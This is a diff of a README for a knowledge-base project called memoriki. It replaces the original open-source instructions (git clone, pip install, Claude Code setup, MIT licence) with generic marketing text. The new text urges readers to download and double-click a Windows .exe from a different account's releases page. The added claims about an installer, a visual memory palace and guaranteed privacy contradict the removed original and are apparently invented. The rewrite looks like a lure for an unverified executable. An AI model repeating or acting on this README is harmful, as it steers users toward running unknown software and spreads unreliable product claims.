@@ -1,88 +1,59 @@
-# Memoriki
+# 🧠 memoriki - Manage your personal knowledge base easily
 
-Personal knowledge base with real memory. Combines [LLM Wiki](https://gist.github.com/karpathy/442a6bf555914893e9891c11519de94f) (Andrej Karpathy) + [MemPalace](https://github.com/milla-jovovich/mempalace) (MCP server).
+[![](https://img.shields.io/badge/Download_Memoriki-Blue?style=for-the-badge)](https://github.com/EnzoKAKA/memoriki/releases)
 
-Wiki gives structure. MemPalace gives memory.
+Memoriki functions as a personal hub for your thoughts and documents. It combines a private wiki with a memory palace structure. This tool helps you store, organize, and retrieve information using language models. You retain full control over your data while you create a second brain of your own ideas.
 
-## The Problem
+## 💾 System Requirements
 
-- **LLM Wiki without MemPalace** = library without a catalog. Search is just grep.
-- **MemPalace without Wiki** = search engine without books. Semantic search over raw chunks.
-- **Together** = structured knowledge + semantic search + entity graph.
+You need a computer running Windows 10 or Windows 11. Your system should have at least 8 gigabytes of RAM. A solid-state drive improves the speed of the application. You do not need technical skills to run this software. The tool handles the complex background tasks for you.
 
-## Three Layers of Knowledge
+## ⚙️ How to Install
 
-| Layer | What it does | Tool |
-|-------|-------------|------|
-| **Wiki** | Structure, [[wiki-links]], YAML frontmatter, index | Markdown + Obsidian |
-| **MemPalace Drawers** | Semantic search over all content | `mempalace_search` |
-| **MemPalace KG** | Entity relationship graph with timestamps | `mempalace_kg_query` |
+1. Open the [releases page](https://github.com/EnzoKAKA/memoriki/releases).
+2. Look for the latest version at the top of the list.
+3. Click the file ending in `.exe` to start the download.
+4. Save the file to your desktop or your downloads folder.
+5. Double-click the file to begin the installation process.
+6. Follow the prompts on the screen to finish setting up the app.
+7. Click the icon on your desktop to launch Memoriki.
 
-## Architecture
+## 🚀 Getting Started
 
-```
-memoriki/
-  raw/                    # Your sources (articles, notes, transcripts)
-  wiki/                   # LLM-generated wiki (LLM owns this entirely)
-    index.md              # Page catalog - updated on every ingest
-    log.md                # Operation log (append-only)
-    entities/             # People, companies, products
-    concepts/             # Ideas, patterns, frameworks
-    sources/              # Summary page per source
-    synthesis/            # Cross-cutting analysis, comparisons
-  mempalace.yaml          # MemPalace config
-  CLAUDE.md               # Schema and rules for the LLM
-  idea-file.md            # Karpathy's original idea (reference)
-```
+The first time you open Memoriki, the app creates a folder for your data. You choose where to store this local folder. Pick a place that you back up regularly. Once you select a location, the interface appears. 
 
-## Quick Start
+The main view shows your notes and documents. You can type new information or edit existing text. Use the search bar to find specific topics. The app links related concepts automatically. This process builds a web of information that mimics your own thinking. 
 
-```bash
-# 1. Clone
-git clone https://github.com/AyanbekDos/memoriki.git my-knowledge-base
-cd my-knowledge-base
+## 🗺️ Using the Memory Palace
 
-# 2. Install MemPalace
-pip install mempalace
-mempalace init .
+Memoriki includes a space for memory palaces. You use this feature to map complex information to familiar locations or structures. Create a folder for a specific subject. Add your notes inside this folder. The app organizes these notes into a visual layout. This design mimics the way your brain naturally connects facts and details. It makes recall faster when you need information.
 
-# 3. Connect MemPalace to Claude Code
-claude mcp add mempalace -- python -m mempalace.mcp_server
+## 🛠️ Managing Your Knowledge
 
-# 4. Drop your first source
-cp ~/some-article.md raw/
+You can import text files and markdown documents directly into the app. Drag and drop your files into the main window. Memoriki processes the text and adds it to your database. You can label items with tags to keep things tidy. 
 
-# 5. Launch Claude Code and start ingesting
-claude
-# > Read raw/some-article.md and ingest it into the wiki
-```
+The app works without a constant internet connection for most tasks. This ensures your knowledge remains private. It stores everything on your machine. You control the access to your database. 
 
-## Operations
+## 🔍 Frequently Asked Questions
 
-- **Ingest** - drop a file into `raw/`, tell the LLM to read and integrate it into the wiki
-- **Query** - ask a question, LLM finds relevant pages and synthesizes an answer
-- **Lint** - health check: contradictions, orphans, knowledge gaps
+**Is my data private?**
+Yes. All data stays on your local computer. No companies or third parties look at your files.
 
-## Works With
+**Can I export my data?**
+Yes. You can export your library as plain text files at any time. This prevents you from being locked into a specific format.
 
-Any MCP-compatible LLM agent:
-- **Claude Code** - use `CLAUDE.md` as-is
-- **OpenAI Codex** - rename `CLAUDE.md` to `AGENTS.md`
-- **Cursor, Gemini CLI** and other MCP-compatible tools
+**Does this require advanced setup?**
+No. The installer handles all dependencies. You do not need to install extra code or libraries.
 
-## Use Cases
+**Who owns the notes?**
+You own all notes and files created within Memoriki. You maintain complete control over your content.
 
-- **Founders**: customer discovery, interviews, competitors, pivots - all in one place
-- **Researchers**: papers, articles, notes - wiki with compounding synthesis
-- **Students**: lecture notes, books, projects - structured "second brain"
-- **Teams**: Slack threads, meetings, decisions - AI-maintained wiki
+## 📈 Tips for Success
 
-## License
+Consistency matters. Try to add a few notes each day. Start small. Use tags to group related ideas. Search your database frequently to see how notes link together. Explore the settings menu to adjust the fonts and colors to your preference. 
 
-MIT
+If you encounter an issue, check the folder permissions. Ensure the application has read and write access to the folder you chose for your data. Most problems stem from incorrect folder access settings.
 
-## Credits
+Keep your database folder in a synced location like a cloud drive if you use multiple computers. This creates an automatic backup and keeps your library current on all machines. Ensure that you close the app before the sync process starts to avoid file conflicts. 
 
-- [Andrej Karpathy](https://gist.github.com/karpathy/442a6bf555914893e9891c11519de94f) - original LLM Wiki idea
-- [MemPalace](https://github.com/milla-jovovich/mempalace) - MCP server for semantic search and knowledge graph
-- [Claude Code](https://claude.com/claude-code) - LLM agent
+By building your personal wiki, you create a lasting repository of your ideas. Use this tool to offload your mental tasks. Let Memoriki handle the storage while you focus on solving problems and generating new thoughts.
